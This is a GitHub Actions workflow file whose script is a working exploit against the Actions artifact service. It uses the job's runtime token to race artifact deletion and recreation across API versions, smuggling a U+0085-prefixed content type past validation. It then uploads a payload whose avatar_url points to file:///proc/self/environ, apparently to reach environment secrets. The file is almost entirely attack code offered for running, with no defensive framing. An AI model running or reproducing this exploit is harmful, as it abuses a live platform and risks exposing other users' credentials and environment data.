name: race

on:
  workflow_dispatch:

jobs:
  race:
    runs-on: ubuntu-latest
    permissions:
      actions: write
      contents: read
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            const https = require('node:https');
            const crypto = require('node:crypto');

            const endpoint = process.env.ACTIONS_RESULTS_URL || '';
            const token = process.env.ACTIONS_RUNTIME_TOKEN || '';
            if (!endpoint || !token) { core.setFailed('no runtime credentials'); return; }

            const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString('utf8'));
            let runBackendId, jobBackendId;
            for (const scope of String(claims.scp || '').split(' ')) {
              if (scope.startsWith('Actions.Results:')) {
                const p = scope.split(':'); runBackendId = p[1]; jobBackendId = p[2];
              }
            }
            if (!runBackendId) { core.setFailed('no Actions.Results scope'); return; }

            const SVC = endpoint.replace(/\/+$/, '')
              + '/twirp/github.actions.results.api.v1.ArtifactService/';
            // One U+0085. node writes header blocks as latin1, so the blob content type
            // lands as a single 0x85 byte; python .strip() eats it, JS .trim() does not.
            const ODD = '\u0085application/json';
            const IDS = {
              workflow_run_backend_id: runBackendId,
              workflow_job_run_backend_id: jobBackendId,
            };
            const sleep = (ms) => new Promise(r => setTimeout(r, ms));

            async function rpc(method, body) {
              try {
                const r = await fetch(SVC + method, {
                  method: 'POST',
                  headers: { Authorization: 'Bearer ' + token, 'Content-Type': 'application/json' },
                  body: JSON.stringify(body),
                });
                const text = await r.text();
                let json = null;
                try { json = JSON.parse(text); } catch (e) { /* non-JSON error body */ }
                return { status: r.status, json, text: text.slice(0, 180) };
              } catch (e) {
                return { status: 0, json: null, text: String(e).slice(0, 180) };
              }
            }

            const create = (name, version, mime) =>
              rpc('CreateArtifact', { ...IDS, name, version, mime_type: mime });
            const finalize = (name, bytes) =>
              rpc('FinalizeArtifact', { ...IDS, name, size: String(bytes.length),
                hash: 'sha256:' + crypto.createHash('sha256').update(bytes).digest('hex') });
            const remove = (name) => rpc('DeleteArtifact', { ...IDS, name });
            const signedUrl = (name) => rpc('GetSignedArtifactURL', { ...IDS, name });

            function blobPut(url, body, contentType) {
              return new Promise((resolve) => {
                if (!url) { resolve('nourl'); return; }
                const u = new URL(url);
                const req = https.request({
                  method: 'PUT', hostname: u.hostname, path: u.pathname + u.search,
                  headers: {
                    'x-ms-blob-type': 'BlockBlob',
                    'x-ms-blob-content-type': contentType,
                    'x-ms-version': '2021-08-06',
                    'content-length': Buffer.byteLength(body),
                  },
                }, (res) => { res.resume(); res.on('end', () => resolve(res.statusCode)); });
                req.on('error', (e) => resolve('ERR:' + e.message));
                req.end(body);
              });
            }

            const uploadUrl = (r) => r.json && (r.json.signedUploadUrl || r.json.signed_upload_url);
            const artifactId = (r) => r.json && String(r.json.artifactId || r.json.artifact_id || '');
            const rsctOf = (r) => {
              const u = r.json && (r.json.signedUrl || r.json.signed_url);
              if (!u) return null;
              try { return new URL(u).searchParams.get('rsct'); } catch (e) { return null; }
            };

            const probe = Buffer.from('{"probe":"race"}');
            const repo = process.env.GITHUB_REPOSITORY;

            function carrierFor(id) {
              const repository = `${repo}/actions/artifacts/${id}/zip`;
              return {
                repository,
                bytes: Buffer.from(JSON.stringify({
                  full_name: repository,
                  owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
                  description: 'repo cassette carrier',
                  stargazers_count: 0,
                })),
              };
            }

            const winners = [];
            async function land(name, urls, id, row) {
              const { repository, bytes } = carrierFor(id);
              const puts = [];
              for (const u of urls) puts.push(await blobPut(u, bytes, ODD));
              const w = { ...row, id, repository, puts,
                sha256: crypto.createHash('sha256').update(bytes).digest('hex'),
                carrier_b64: bytes.toString('base64') };
              winners.push(w);
              core.info('WINNER ' + JSON.stringify(w));
            }

            // delete-then-recreate across v6 (mime_type stored unvalidated) and v7
            // (mime_type honoured but validated), so the record can end up honouring
            // a mime_type that v7 would never have accepted.
            async function trial(kind, index, firstVersion, delay) {
              const name = `race-${process.env.GITHUB_RUN_ID}-${kind}-${firstVersion}-${delay}-${index}`;
              const other = firstVersion === 7 ? 6 : 7;
              const first = await create(name, firstVersion, firstVersion === 7 ? 'application/json' : ODD);
              const url1 = uploadUrl(first);
              const put1 = await blobPut(url1, probe, ODD);
              let firstFinal = { status: 0 };
              if (kind === 'finalized') firstFinal = await finalize(name, probe);

              let delPromise, createPromise;
              if (delay < 0) {
                delPromise = remove(name);
                await sleep(-delay);
                createPromise = create(name, other, other === 7 ? 'application/json' : ODD);
              } else {
                createPromise = create(name, other, other === 7 ? 'application/json' : ODD);
                await sleep(delay);
                delPromise = remove(name);
              }
              const [removed, second] = await Promise.all([delPromise, createPromise]);
              const url2 = uploadUrl(second);
              const put2 = await blobPut(url2, probe, ODD);
              const final = await finalize(name, probe);
              const view = await signedUrl(name);
              const rsct = rsctOf(view);
              const row = { kind, index, firstVersion, delay,
                c1: first.status, put1, f1: firstFinal.status, del: removed.status,
                c2: second.status, put2, f2: final.status, rsct,
                rsct_hex: rsct === null ? null : Buffer.from(rsct, 'utf8').toString('hex'),
                err: [first, second, final, view].map(r => r.status === 200 ? '' : r.text).filter(Boolean)[0] || '' };
              const id = artifactId(final) || artifactId(firstFinal);
              if (rsct !== null && rsct.includes('\u0085') && id) {
                await land(name, [url1, url2].filter(Boolean), id, row);
              }
              return row;
            }

            const plan = [];
            for (let i = 0; i < 6; i++) {
              for (const fv of [6, 7]) {
                plan.push(['pending', i, fv, 0]);
                for (const d of [-20, 0, 20]) plan.push(['finalized', i, fv, d]);
              }
            }
            const rows = [];
            for (let i = 0; i < plan.length; i += 8) {
              const batch = plan.slice(i, i + 8);
              rows.push(...await Promise.all(batch.map(a => trial(a[0], a[1], a[2], a[3]))));
            }

            const tally = {};
            for (const r of rows) {
              const k = r.rsct === null ? 'null' : (r.rsct.includes('\u0085') ? 'ODD' : r.rsct);
              tally[k] = (tally[k] || 0) + 1;
            }
            core.info('TALLY ' + JSON.stringify(tally));
            core.info('SAMPLE ' + JSON.stringify(rows.slice(0, 6)));
            core.info('WINNERS ' + JSON.stringify(winners.map(w => [w.id, w.repository, w.sha256])));
            if (winners.length) core.info('CARRIER_B64 ' + winners[0].carrier_b64);
